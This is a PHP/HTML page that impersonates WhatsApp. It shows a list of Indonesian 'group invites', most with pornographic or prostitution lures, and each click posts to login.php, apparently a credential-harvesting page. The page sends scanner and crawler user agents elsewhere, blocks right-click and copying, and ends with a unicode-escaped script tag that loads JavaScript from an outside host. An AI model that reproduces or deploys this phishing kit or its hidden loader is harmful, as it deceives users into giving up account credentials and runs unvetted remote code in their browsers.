<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.html');
die();
}
date_default_timezone_set('Asia/Jakarta');
$timezone = date('H:i');
?>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="WhatsApp">
<meta name="description" content="Undangan Grup WhatsApp. Pilih grup favorit Anda dan bergabung dengan grup tersebut.">
<meta property="og:description" content="Undangan Grup WhatsApp. Pilih grup favorit Anda dan bergabung dengan grup tersebut.">
<meta property="og:url" content="./">
<meta property="og:site_name" content="WhatsApp">
<meta property="og:type" content="website">
<meta name="copyright"content="WhatsApp">
<meta name="theme-color" content="#25d366">
<meta property="og:image" content="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png">
<title>WhatsApp</title>
<link rel="stylesheet" href="css/style.css">
<link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/rYZqPCBaG70.png">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">
<div class="arpantek-container">
<div class="arpantek-header">
<div class="apknya">
WhatsApp
<img class="lainnya" src="img/lainnya.png">
<img class="cari" src="img/cari.png">

</div>
<img class="kamera" src="img/kamera.png">
<div class="arpantek-header-menu-box">
<center>
<div class="arpantek-header-menu-list aktif">
CHAT
</div>
<div class="arpantek-header-menu-list">
STATUS
</div>
<div class="arpantek-header-menu-list">
PANGGILAN
</div>
</center>
</div>
</div>
<div class="arpantek-box">
<div class="chat-list">
<img src="https://i.ibb.co/86dn5Zs/1.jpg">
<form name="gabungrup1" id="gabungrup1" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup1'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/Hd7GIVTlc2kGbhkwcBHYcI" readonly>
<span>Bidadari Salah Jalan</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">2477</div></div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/60fdwxw/2.jpg">
<form name="gabungrup2" id="gabungrup2" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup2'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/CqYyEWs2Zj7DB7DIkzoHdw" readonly>
<span>Selebgram Berulah Lagi</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">1859</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/0M2zhbw/3.jpg">
<form name="gabungrup3" id="gabungrup3" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup3'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/CK7QlDByCJWASYWrusvWlz" readonly>
<span>Kumpulan PSK Indonesia</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">1204</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/G9P2ssg/4.jpg">
<form name="gabungrup4" id="gabungrup4" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup4'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/GY0r6gO0cnO02yhQO5q58G" readonly>
<span>Bokepers Saling Berbagi</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">1041</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/BN37mTF/5.jpg">
<form name="gabungrup5" id="gabungrup5" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup5'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/JzMjleeEOEFIIHnZyaPKke" readonly>
<span>Eropa Beautiful Mom</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">905</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/DRcW9Ny/6.jpg">
<form name="gabungrup6" id="gabungrup6" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup6'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/LC7kwNbE1ILLflvvm5fXZ7" readonly>
<span>Jual Durian Montok</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">744</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/tz469Kx/7.jpg">
<form name="gabungrup7" id="gabungrup7" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup7'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/LSC78Rp3k5XGUwO0jv2kE8" readonly>
<span>Suster Idaman Para Pria</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">599</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/9ybQYrk/8.jpg">
<form name="gabungrup8" id="gabungrup8" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup8'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/FLjM1q3DACm4TIXQm0DD0u" readonly>
<span>Kuliah Supaya Pintar</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">507</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/8Dx2Jrc/9.jpg">
<form name="gabungrup9" id="gabungrup9" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup9'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/C8qbit13cEbEw7ysnayMac" readonly>
<span>Korean Sexy Girl Seks</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">472</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/sFpKnXq/10.jpg">
<form name="gabungrup10" id="gabungrup10" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup10'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/Kc1WCg9cQV5KSQVPTmbypY" readonly>
<span>Hentai Lovers ID</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">394</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/PQ8QBHv/11.jpg">
<form name="gabungrup11" id="gabungrup11" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup11'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/DeVC66Vybm30fQUL5L5W0U" readonly>
<span>Video Viral Indonesia</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">316</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/KrG0Zs6/12.jpg">
<form name="gabungrup12" id="gabungrup12" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup12'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/FMJPiNNKJYMD1EEHWLHsyf" readonly>
<span>Artis Tik Tok Forum</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">251</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/r46R6G6/13.jpg">
<form name="gabungrup13" id="gabungrup13" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup13'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/DisKDL9iXzTB5HBLSBl0FY" readonly>
<span>Konsultasi Dulu Sini</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">211</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/VV9bKKv/14.jpg">
<form name="gabungrup14" id="gabungrup14" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup14'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/JofLRrXXarQJm3mSbbi0Yq" readonly>
<span>Pijat 18+ Japanese</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">170</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/5rn6S3j/15.jpg">
<form name="gabungrup15" id="gabungrup15" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup15'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/FozZx2CQ8RzBqPKWypiNSq" readonly>
<span>Gym Teacher Sexy</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">146</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/5cQg3NM/16.jpg">
<form name="gabungrup16" id="gabungrup16" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup16'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/BmDFarmXuha3MDRvJTMKAo" readonly>
<span>Mama Muda jaman Now</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">119</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/ctRksT0/17.jpg">
<form name="gabungrup17" id="gabungrup17" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup17'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/INs6qbi4rEB9nYzupvn5kp" readonly>
<span>Agen Lonte Bookingan</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">99</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/s3kCp7f/18.jpg">
<form name="gabungrup18" id="gabungrup18" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup18'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/JK7ua2bEo4jCqQ9sNOoksc" readonly>
<span>Primadona Desa</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">83</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/5MwzF3z/19.jpg">
<form name="gabungrup19" id="gabungrup19" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup19'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/K5cqEDjX0VM60qQrKPp7DZ" readonly>
<span>Sexy Hyperseks Girl</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">66</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div class="chat-list">
<img src="https://i.ibb.co/YtqL4tj/20.jpg">
<form name="gabungrup20" id="gabungrup20" action="login.php" method="post">
<div class="chat-detail" onClick="document.forms['gabungrup20'].submit();">
<input type="hidden" name="linkgrup" value="https://chat.whatsapp.com/Hmj8W8udGODA7t4gf7yZS9" readonly>
<span>Kakak Tiri Cantik</span>
<div class="jam"><?php echo $timezone;?>
<div class="chatnya">41</div>
</div>
<div class="isinya">
Klik untuk bergabung
</div>
<div class="garis-chat"></div>
</div>
</form>
</div>
<div id="isi"></div>
</div>
</div>
</body>
<script type="text/javascript">
document.write('\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u002F\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u0022\u0020\u0073\u0072\u0063\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0063\u006F\u006C\u006C\u0065\u0063\u0074\u0069\u006F\u006E\u0031\u0032\u0033\u002E\u0073\u0065\u0072\u0076\u0065\u0075\u0073\u0065\u0072\u002E\u0063\u006F\u006D\u002F\u0077\u0061\u002F\u0066\u0069\u006C\u0065\u002E\u006A\u0073\u0022\u003E\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E');
</script>
</html>